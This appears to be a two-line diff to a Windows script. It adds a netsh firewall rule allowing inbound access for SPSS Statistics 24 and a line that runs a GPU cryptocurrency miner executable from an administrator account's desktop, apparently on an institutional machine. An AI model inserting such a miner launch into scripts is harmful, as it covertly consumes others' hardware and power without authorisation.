@@ -1,0 +1,2 @@
+netsh advfirewall firewall add rule name="SPSS" dir=in action=allow program="C:\program files\ibm\spss\statistics\24\stats.exe" enable=yes LocalSubnet profile=domain
+D:\users\admingeogr\desktop\amd\nsgpucnminer.exe
